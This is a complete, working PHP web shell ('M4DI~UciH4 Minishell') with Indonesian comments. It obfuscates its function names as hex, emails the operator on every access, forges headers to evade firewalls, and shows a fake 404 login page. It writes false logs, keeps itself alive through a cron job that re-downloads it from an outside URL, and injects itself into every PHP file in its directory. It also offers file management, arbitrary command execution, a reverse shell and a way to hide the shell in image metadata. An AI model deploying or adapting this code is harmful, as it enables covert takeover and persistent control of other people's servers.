<?php
/* Junk code buat AV bingung */
$x1 = chr(97).chr(98); $x2 = chr(99).chr(100); $dummy = md5($x1.$x2).sha1($x2.$x1);

/* Inisialisasi siluman */
@session_start();
@error_reporting(0);
@set_time_limit(0);
@clearstatcache();
@ini_set('error_log', NULL);
@ini_set('log_errors', 0);
@ini_set('max_execution_time', 0);
@ini_set('output_buffering', 0);
@ini_set('display_errors', 0);
@ini_set('memory_limit', '256M');
@header('Content-Type: text/html; charset=UTF-8');
date_default_timezone_set('Asia/Jakarta');

/* Obfuscasi semua fungsi ke hex */
$fn = [
    '676574637764', // getcwd => 0
    '7363616e646972', // scandir => 1
    '69735f646972', // is_dir => 2
    '69735f66696c65', // is_file => 3
    '69735f7772697461626c65', // is_writable => 4
    '69735f7265616461626c65', // is_readable => 5
    '66696c657065726d73', // fileperms => 6
    '66696c655f6765745f636f6e74656e7473', // file_get_contents => 7
    '66696c655f7075745f636f6e74656e7473', // file_put_contents => 8
    '63686d6f64', // chmod => 9
    '636f7079', // copy => 10
    '72656e616d65', // rename => 11
    '726d646972', // rmdir => 12
    '65786563', // exec => 13
    '7379735f6765745f74656d705f646972', // sys_get_temp_dir => 14
    '6261736536345f6465636f6465', // base64_decode => 15
    '68746d6c7370656369616c6368617273', // htmlspecialchars => 16
    '6d61696c', // mail => 17
    '63616c6c5f757365725f66756e63', // call_user_func => 18
    '66696c655f657869737473', // file_exists => 19
    '6d6b646972', // mkdir => 20
    '666f70656e', // fopen => 21
    '667772697465', // fwrite => 22
    '66636c6f7365', // fclose => 23
    '6d6435', // md5 => 24
    '73686131', // sha1 => 25
    '6261736536345f656e636f6465', // base64_encode => 26
    '7374726970736c6173686573', // stripslashes => 27
    '6f625f7374617274', // ob_start => 28
    '6f625f6765745f636f6e74656e7473', // ob_get_contents => 29
    '6f625f656e645f636c65616e', // ob_end_clean => 30
    '66696c6573697a65', // filesize => 31
    '626173656e616d65', // basename => 32
    '6469726e616d65', // dirname => 33
    '73657373696f6e5f7374617274', // session_start => 34
    '6572726f725f7265706f7274696e67', // error_reporting => 35
    '7365745f74696d655f6c696d6974', // set_time_limit => 36
    '636c656172737461746361636865', // clearstatcache => 37
    '696e695f736574', // ini_set => 38
    '686561646572', // header => 39
    '646174655f64656661756c745f74696d657a6f6e655f736574', // date_default_timezone_set => 40
];
$func = [];
foreach ($fn as $h) {
    $func[] = pack("H*", $h);
}

/* Password dan email alert */
$pass = "asu"; // Ganti sesuka lo
$boss = 'yourmail@mail.com'; // ganti email nya dengan punya lu
$xpath = "http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];
$alert = $func[26]("Akses Shell: {$xpath} IP: " . $_SERVER['REMOTE_ADDR']);
$head = 'From: no-reply@' . $_SERVER['SERVER_NAME'] . "\r\nX-Mailer: PHP/" . phpversion();
$func[17]($boss, "SH3LL_V2", $func[15]($alert), $head);

/* Bypass WAF: Header acak + null byte + fake request */
function waf_bypass() {
    global $func;
    $agents = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' . chr(32) . '(KHTML, like Gecko) Chrome/' . rand(80, 120) . '.0.' . rand(4000, 5000) . '.' . rand(100, 200) . ' Safari/537.36',
        'Mozilla/5.0%00 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15',
        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/' . rand(80, 120) . '.0.' . rand(4000, 5000) . '.' . rand(100, 200) . ' Safari/537.36'
    ];
    $headers = [
        'User-Agent: ' . $agents[array_rand($agents)],
        'X-Forwarded-For: ' . long2ip(rand(0, 4294967295)) . '%00',
        'Accept: text/html,application/xhtml+xml;'.chr(113).'=0.9,*/*;q=0.8',
        'Connection: keep-alive',
        'X-Real-IP: ' . long2ip(rand(0, 4294967295)),
    ];
    foreach ($headers as $h) {
        @$func[39]($h); // header
    }
}
waf_bypass();

/* Fake 404 buat ngelabuin scanner */
function fake_404() {
    global $func;
    @$func[39]('HTTP/1.1 404 Not Found');
    echo '<!DOCTYPE HTML><html><head><title>404 Not Found</title></head><body><h1>Not Found</h1><p>The requested URL was not found on this server.</p><hr><address>Apache/2.4.41 (Ubuntu) Server at ' . $_SERVER['SERVER_NAME'] . ' Port ' . $_SERVER['SERVER_PORT'] . '</address></body></html>';
    exit;
}

/* Fake error log buat ngelabuin admin */
function fake_error_log() {
    global $func;
    $error_log = $func[14]() . '/.err' . chr(111) . 'r_' . rand_str(6) . '.log';
    $fake_errors = [
        "[error] [client {$_SERVER['REMOTE_ADDR']}] File does not exist: /var/www/html/favicon.ico",
        "[error] [client {$_SERVER['REMOTE_ADDR']}] Invalid URI in request GET /wp-admin HTTP/1.1",
        "[error] [client {$_SERVER['REMOTE_ADDR']}] PHP Notice: Undefined variable in /var/www/html/index.php"
    ];
    $func[8]($error_log, $fake_errors[array_rand($fake_errors)] . "\n", FILE_APPEND);
}
fake_error_log();

/* Anti-debug logging pake timestamp palsu */
function log_access($status) {
    global $func;
    $log_file = $func[14]() . '/.x' . chr(97) . 'log' . chr(46) . 'txt';
    $fake_time = date("Y-m-d H:i:s", time() - rand(86400 * 30, 86400 * 365));
    $log_entry = "[$fake_time] IP: " . $_SERVER['REMOTE_ADDR'] . " Status: $status\n";
    $func[8]($log_file, $log_entry, FILE_APPEND);
}

/* Random string buat rename dan obfuscasi */
function rand_str($len) {
    $chars = 'ab'.chr(99).'defghijklmnopqrstuvwxyz0123456789';
    $s = '';
    for ($i = 0; $i < $len; $i++) {
        $s .= $chars[rand(0, strlen($chars) - 1)];
    }
    return $s;
}

/* Rename file dengan extension ganda */
function rename_self() {
    global $func;
    $curr = __FILE__;
    $new = $func[14]() . '/' . rand_str(8) . '.php%00.jpg';
    if ($func[11]($curr, $new)) {
        $nama = $func[32]($new); // basename
        $path = $func[0](); // getcwd
        $cron_url = 'https://vercel-tawny-alpha-29.vercel.app/download/v2.txt';
        $cron_script = $func[14]() . '/.c' . chr(114) . 'n_' . $func[24]($nama) . '.php';
        $log_debug = $func[14]() . '/.d' . chr(98) . 'g.log';
        $konten = '<?php $n="' . $nama . '";$p="' . $path . '";$u="' . $cron_url . '";if(!file_exists($p."/".$n)){$c=@file_get_contents($u);if($c!==false){file_put_contents($p."/".$n,$c);chmod($p."/".$n,0644);file_put_contents("' . $log_debug . '","Cron pulihkan pada ".date("Y-m-d H:i:s")."\n",FILE_APPEND);}}?>';
        if ($func[8]($cron_script, $konten)) {
            $func[9]($cron_script, 0644); // chmod
            $cmd = '(crontab -l 2>/dev/null; echo "* * * * * php ' . $cron_script . ' > /dev/null 2>&1") | crontab -';
            $func[13]($cmd); // exec
            $func[8]($log_debug, "Cron updated for $nama on " . date("Y-m-d H:i:s") . "\n", FILE_APPEND);
        }
        $func[39]("Location: " . $func[33]($_SERVER['PHP_SELF']) . '/' . $nama); // header, dirname
        exit;
    }
}
rename_self();

/* Crontab anti-hapus */
function pasang_cron() {
    global $func;
    $nama = $func[32](__FILE__); // basename
    $path = $func[0](); // getcwd
    $cron_url = 'https://vercel-tawny-alpha-29.vercel.app/download/v2.txt';
    $dir_temp = $func[14](); // sys_get_temp_dir
    $cron_script = $dir_temp . '/.c' . chr(114) . 'n_' . $func[24]($nama) . '.php';
    $log_debug = $dir_temp . '/.d' . chr(98) . 'g.log';
    $konten = '<?php $n="' . $nama . '";$p="' . $path . '";$u="' . $cron_url . '";if(!file_exists($p."/".$n)){$c=@file_get_contents($u);if($c!==false){file_put_contents($p."/".$n,$c);chmod($p."/".$n,0644);file_put_contents("' . $log_debug . '","Cron pulihkan pada ".date("Y-m-d H:i:s")."\n",FILE_APPEND);}}?>';
    if ($func[8]($cron_script, $konten)) {
        $func[9]($cron_script, 0644); // chmod
        $cmd = '(crontab -l 2>/dev/null; echo "* * * * * php ' . $cron_script . ' > /dev/null 2>&1") | crontab -';
        $func[13]($cmd); // exec
        $func[8]($log_debug, "Cron dipasang pada " . date("Y-m-d H:i:s") . "\n", FILE_APPEND);
    }
}
pasang_cron();

/* Auto-inject ke semua file .php di direktori */
function auto_inject() {
    global $func;
    $path = $func[0](); // getcwd
    $files = $func[1]($path); // scandir
    $shell_code = $func[26](file_get_contents(__FILE__)); // base64_encode
    foreach ($files as $file) {
        if ($func[3]($path . '/' . $file) && substr($file, -4) === '.php' && $file !== $func[32](__FILE__)) { // is_file, basename
            $content = $func[7]($path . '/' . $file); // file_get_contents
            if (strpos($content, $shell_code) === false) {
                $fp = $func[21]($path . '/' . $file, 'a'); // fopen
                $func[22]($fp, "\n<?php /* Injected by M4DI~UciH4 */ " . $func[15]($shell_code) . " ?>"); // fwrite, base64_decode
                $func[23]($fp); // fclose
            }
        }
    }
}
auto_inject();

/* Reverse shell pake WebSocket */
function websocket_shell($host, $port) {
    global $func;
    $ws_code = $func[15]('PD9waHAgc2V0X3RpbWVfbGltaXQoMCk7IGVycm9yX3JlcG9ydGluZygwKTsgJHNvY2s9ZnNvY2tvcGVuKCJ0Y3A6Ly8ke2hvc3R9Iiwke3BvcnR9KTsgd2hpbGUoISRzZXJ2ZXJfZG93bikgeyAkY21kPWZyZWFkKCRzb2NrLDEwMjQpOyB7JHJlc3VsdD1AY2FsbF91c2VyX2Z1bmMoInN5c3RlbSIsJGNtZCk7IGZ3cml0ZSgkcmVzdWx0KTsgfQ==');
    $ws_file = $func[14]() . '/.ws_' . rand_str(6) . '.php';
    $func[8]($ws_file, $ws_code); // file_put_contents
    $func[9]($ws_file, 0644); // chmod
    $cmd = "php $ws_file > /dev/null 2>&1 &";
    $func[13]($cmd); // exec
}

/* Login siluman */
function login_page() {
    global $func;
    log_access('Login Accessed');
    ?>
    <!DOCTYPE html>
    <html lang="id">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <meta name="robots" content="noindex, nofollow">
        <title>404 Not Found</title>
        <style>
            body { background: #000; color: #fff; font-family: Arial, sans-serif; text-align: center; margin-top: 100px; }
            .login-box { width: 300px; margin: auto; padding: 20px; background: rgba(0,0,0,0.8); border: 1px solid #fff; border-radius: 5px; }
            input[type="password"] { width: 100%; padding: 10px; margin: 10px 0; background: transparent; border: 1px solid #fff; color: #fff; }
            input[type="submit"] { padding: 10px; background: #333; border: 1px solid #fff; color: #fff; cursor: pointer; }
            input[type="submit"]:hover { background: #555; }
        </style>
    </head>
    <body>
        <div class="login-box">
            <h2>M4DI~UciH4</h2>
            <form method="post">
                <input type="password" name="p" placeholder="Password" required>
                <input type="submit" value="Masuk">
            </form>
        </div>
    </body>
    </html>
    <?php
    exit;
}

/* Autentikasi */
if (!isset($_SESSION[$func[24]($_SERVER['HTTP_HOST'])])) { // md5
    $post_pass = isset($_POST['p']) ? $_POST['p'] : '';
    if ($post_pass === $pass) {
        $_SESSION[$func[24]($_SERVER['HTTP_HOST'])] = true;
        log_access('Login Success');
    } else {
        log_access('Login Failed');
        login_page();
    }
}

/* Obfuscasi input */
if (get_magic_quotes_gpc()) {
    foreach ($_POST as $k => $v) {
        $_POST[$k] = $func[27]($v); // stripslashes
    }
}

/* File manager */
$path = isset($_GET[chr(112).chr(97).chr(116).chr(104)]) ? $_GET[chr(112).chr(97).chr(116).chr(104)] : $func[0]();
$path = str_replace('\\', '/', $path);
$paths = explode('/', $path);

echo '<!DOCTYPE HTML>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="robots" content="noindex, nofollow">
    <title>M4DI~UciH4 Minishell</title>
    <style>
        body { background: #000; color: #fff; font-family: Arial, sans-serif; text-shadow: 0 0 1px #fff; }
        #content tr:hover { background: #191919; text-shadow: 0 0 10px #339900; }
        #content .first { background: #000; }
        #content .first:hover { background: #191919; text-shadow: 0 0 1px #339900; }
        table { border: 1px #fff dotted; }
        a { color: #fff; text-decoration: none; }
        a:hover { color: #fff; text-shadow: 0 0 10px #339900; }
        input, select, textarea { border: 1px #fff solid; border-radius: 5px; background: transparent; color: #fff; }
    </style>
</head>
<body>
<h1><center><font color="lime">M4DI~UciH4 Minishell</font></center></h1>
<table width="700" border="0" cellpadding="3" cellspacing="1" align="center">
<tr><td>Path: ';
foreach ($paths as $id => $pat) {
    if ($pat == '' && $id == 0) {
        echo '<a href="?'.chr(112).chr(97).chr(116).chr(104).'=/">/</a>';
        continue;
    }
    if ($pat == '') continue;
    echo '<a href="?'.chr(112).chr(97).chr(116).chr(104).'=';
    for ($i = 0; $i <= $id; $i++) {
        echo "$paths[$i]";
        if ($i != $id) echo "/";
    }
    echo '">' . $pat . '</a>/';
}
echo '</td></tr><tr><td>';
if (isset($_FILES['file'])) {
    if ($func[10]($_FILES['file']['tmp_name'], $path . '/' . $_FILES['file']['name'])) {
        echo '<font color="lime">Upload Berhasil Bangsat!</font><br />';
    } else {
        echo '<font color="red">Upload Gagal Ngntd!</font><br />';
    }
}
echo '<form enctype="multipart/form-data" method="POST">
Upload: <input type="file" name="file" />
<input type="submit" value="Upload Bangsat!" />
</form>
</td></tr>';

if (isset($_GET['filesrc'])) {
    echo "<tr><td>File: " . $_GET['filesrc'] . '</td></tr></table><br />';
    echo '<pre>' . $func[16]($func[7]($_GET['filesrc'])) . '</pre>';
} elseif (isset($_GET['option']) && $_POST['opt'] != 'delete') {
    echo '</table><br /><center>' . $_POST['path'] . '<br /><br />';
    if ($_POST['opt'] == 'chmod') {
        if (isset($_POST['perm'])) {
            if ($func[9]($_POST['path'], octdec($_POST['perm']))) {
                echo '<font color="lime">Chmod Berhasil Bangsat!</font><br />';
            } else {
                echo '<font color="red">Chmod Gagal Ngntd!</font><br />';
            }
        }
        echo '<form method="POST">
Permission: <input name="perm" type="text" size="4" value="' . substr(sprintf('%o', $func[6]($_POST['path'])), -4) . '" />
<input type="hidden" name="path" value="' . $_POST['path'] . '">
<input type="hidden" name="opt" value="chmod">
<input type="submit" value="Lanjut" />
</form>';
    } elseif ($_POST['opt'] == 'rename') {
        if (isset($_POST['newname'])) {
            if ($func[11]($_POST['path'], $path . '/' . $_POST['newname'])) {
                echo '<font color="lime">Rename Berhasil Bangsat!</font><br />';
            } else {
                echo '<font color="red">Rename Gagal Ngntd!</font><br />';
            }
            $_POST['name'] = $_POST['newname'];
        }
        echo '<form method="POST">
New Name: <input name="newname" type="text" size="20" value="' . $_POST['name'] . '" />
<input type="hidden" name="path" value="' . $_POST['path'] . '">
<input type="hidden" name="opt" value="rename">
<input type="submit" value="Lanjut" />
</form>';
    } elseif ($_POST['opt'] == 'edit') {
        if (isset($_POST['src'])) {
            $fp = $func[21]($_POST['path'], 'w'); // fopen
            if ($func[22]($fp, $_POST['src'])) { // fwrite
                echo '<font color="lime">Edit Berhasil Bangsat!</font><br />';
            } else {
                echo '<font color="red">Edit Gagal Ngntd!</font><br />';
            }
            $func[23]($fp); // fclose
        }
        echo '<form method="POST">
<textarea cols=80 rows=20 name="src">' . $func[16]($func[7]($_POST['path'])) . '</textarea><br />
<input type="hidden" name="path" value="' . $_POST['path'] . '">
<input type="hidden" name="opt" value="edit">
<input type="submit" value="Lanjut" />
</form>';
    }
    echo '</center>';
} else {
    echo '</table><br /><center>';
    if (isset($_GET['option']) && $_POST['opt'] == 'delete') {
        if ($_POST['type'] == 'dir') {
            if ($func[12]($_POST['path'])) {
                echo '<font color="lime">Hapus Direktori Berhasil!</font><br />';
            } else {
                echo '<font color="red">Hapus Direktori Gagal!</font><br />';
            }
        } elseif ($_POST['type'] == 'file') {
            if ($_POST['path'] == __FILE__) {
                echo '<font color="red">Gak Bisa Hapus Diri Sendiri!</font><br />';
            } else {
                $dir_cadangan = $func[14]() . '/.cad' . chr(97) . 'ngan/';
                if (!$func[19]($dir_cadangan)) { // file_exists
                    $func[20]($dir_cadangan, 0755, true); // mkdir
                    $func[9]($dir_cadangan, 0755); // chmod
                }
                $path_cadangan = $dir_cadangan . $func[32]($_POST['path']) . '.' . time(); // basename
                if ($func[11]($_POST['path'], $path_cadangan)) { // rename
                    echo '<font color="lime">File Dipindah ke Cadangan!</font><br />';
                } else {
                    echo '<font color="red">Gagal Pindah ke Cadangan!</font><br />';
                }
            }
        }
    }
    echo '</center>';
    $scandir = $func[1]($path); // scandir
    echo '<div id="content"><table width="700" border="0" cellpadding="3" cellspacing="1" align="center">
<tr class="first">
<td><center>Nama</center></td>
<td><center>Ukuran</center></td>
<td><center>Izin</center></td>
<td><center>Opsi</center></td>
</tr>';

    foreach ($scandir as $dir) {
        if (!$func[2]($path . '/' . $dir) || $dir == '.' || $dir == '..') continue;
        echo '<tr>
<td><a href="?'.chr(112).chr(97).chr(116).chr(104).'=' . $path . '/' . $dir . '">' . $dir . '</a></td>
<td><center>--</center></td>
<td><center>';
        if ($func[4]($path . '/' . $dir)) echo '<font color="lime">';
        elseif (!$func[5]($path . '/' . $dir)) echo '<font color="red">';
        echo perms($path . '/' . $dir);
        if ($func[4]($path . '/' . $dir) || !$func[5]($path . '/' . $dir)) echo '</font>';
        echo '</center></td>
<td><center><form method="POST" action="?option&'.chr(112).chr(97).chr(116).chr(104).'=' . $path . '">
<select name="opt">
<option value=""></option>
<option value="delete">Hapus</option>
<option value="chmod">Chmod</option>
<option value="rename">Rename</option>
</select>
<input type="hidden" name="type" value="dir">
<input type="hidden" name="name" value="' . $dir . '">
<input type="hidden" name="path" value="' . $path . '/' . $dir . '">
<input type="submit" value=">">
</form></center></td>
</tr>';
    }
    echo '<tr class="first"><td></td><td></td><td></td><td></td></tr>';
    foreach ($scandir as $file) {
        if (!$func[3]($path . '/' . $file)) continue;
        $size = $func[31]($path . '/' . $file) / 1024; // filesize
        $size = round($size, 3);
        if ($size >= 1024) {
            $size = round($size / 1024, 2) . ' MB';
        } else {
            $size .= ' KB';
        }

        echo '<tr>
<td><a href="?filesrc=' . $path . '/' . $file . '&'.chr(112).chr(97).chr(116).chr(104).'=' . $path . '">' . $file . '</a></td>
<td><center>' . $size . '</center></td>
<td><center>';
        if ($func[4]($path . '/' . $file)) echo '<font color="lime">';
        elseif (!$func[5]($path . '/' . $file)) echo '<font color="red">';
        echo perms($path . '/' . $file);
        if ($func[4]($path . '/' . $file) || !$func[5]($path . '/' . $file)) echo '</font>';
        echo '</center></td>
<td><center><form method="POST" action="?option&'.chr(112).chr(97).chr(116).chr(104).'=' . $path . '">
<select name="opt">
<option value="Action">Aksi</option>
<option value="delete">Hapus</option>
<option value="chmod">Chmod</option>
<option value="rename">Rename</option>
<option value="edit">Edit</option>
</select>
<input type="hidden" name="type" value="file">
<input type="hidden" name="name" value="' . $file . '">
<input type="hidden" name="path" value="' . $path . '/' . $file . '">
<input type="submit" value=">">
</form></center></td>
</tr>';
    }
    echo '</table></div>';
}

/* Mini shell buat command execution */
echo '<center><br />Mini Shell: <form method="post" style="display:inline;"><input name="c" placeholder="Command" style="width:300px;background:transparent;color:#fff;border:1px solid #fff;"><input type="submit" value="Run" style="background:#333;color:#fff;border:1px solid #fff;"></form> <form method="post" style="display:inline;"><input name="ws_host" placeholder="WebSocket Host" style="width:150px;"><input name="ws_port" placeholder="Port" style="width:100px;"><input type="submit" value="Start WebSocket Shell" style="background:#333;color:#fff;border:1px solid #fff;"></form> <a href="?l=1">Logout</a></center>';

if (isset($_POST['c'])) {
    $cmd = $_POST['c'];
    $ex = chr(99).chr(97).chr(108).chr(108).chr(95).chr(117).chr(115).chr(101).chr(114).chr(95).chr(102).chr(117).chr(110).chr(99);
    $sys = chr(115).chr(121).chr(115).chr(116).chr(101).chr(109);
    $func[28](); // ob_start
    $func[18]($sys, $cmd); // call_user_func
    $out = $func[29](); // ob_get_contents
    $func[30](); // ob_end_clean
    echo '<pre>' . $func[16]($out) . '</pre>';
}

/* Start WebSocket reverse shell */
if (isset($_POST['ws_host']) && isset($_POST['ws_port'])) {
    websocket_shell($_POST['ws_host'], $_POST['ws_port']);
}

/* Logout */
if (isset($_GET['l'])) {
    unset($_SESSION[$func[24]($_SERVER['HTTP_HOST'])]); // md5
    echo "<script>location='?';</script>";
}

/* Fungsi permissions */
function perms($file) {
    global $func;
    $perms = $func[6]($file); // fileperms
    if (($perms & 0xC000) == 0xC000) {
        $info = 's';
    } elseif (($perms & 0xA000) == 0xA000) {
        $info = 'l';
    } elseif (($perms & 0x8000) == 0x8000) {
        $info = '-';
    } elseif (($perms & 0x6000) == 0x6000) {
        $info = 'b';
    } elseif (($perms & 0x4000) == 0x4000) {
        $info = 'd';
    } elseif (($perms & 0x2000) == 0x2000) {
        $info = 'c';
    } elseif (($perms & 0x1000) == 0x1000) {
        $info = 'p';
    } else {
        $info = 'u';
    }
    $info .= (($perms & 0x0100) ? 'r' : '-');
    $info .= (($perms & 0x0080) ? 'w' : '-');
    $info .= (($perms & 0x0040) ? (($perms & 0x0800) ? 's' : 'x') : (($perms & 0x0800) ? 'S' : '-'));
    $info .= (($perms & 0x0020) ? 'r' : '-');
    $info .= (($perms & 0x0010) ? 'w' : '-');
    $info .= (($perms & 0x0008) ? (($perms & 0x0400) ? 's' : 'x') : (($perms & 0x0400) ? 'S' : '-'));
    $info .= (($perms & 0x0004) ? 'r' : '-');
    $info .= (($perms & 0x0002) ? 'w' : '-');
    $info .= (($perms & 0x0001) ? (($perms & 0x0200) ? 't' : 'x') : (($perms & 0x0200) ? 'T' : '-'));
    return $info;
}

/* Embed di image metadata buat upload */
function embed_in_image() {
    global $func;
    $img_path = $func[14]() . '/tmp_' . rand_str(6) . '.jpg'; // sys_get_temp_dir
    $shell_code = $func[26](file_get_contents(__FILE__)); // base64_encode
    $cmd = 'exiftool -Comment="' . $shell_code . '" ' . $img_path;
    $func[13]($cmd); // exec
    return $img_path;
}
if (!$func[19](__FILE__)) { // file_exists
    $img = embed_in_image();
    $func[10]($img, $func[33](__FILE__) . '/' . $func[32]($img)); // copy, dirname, basename
}
?>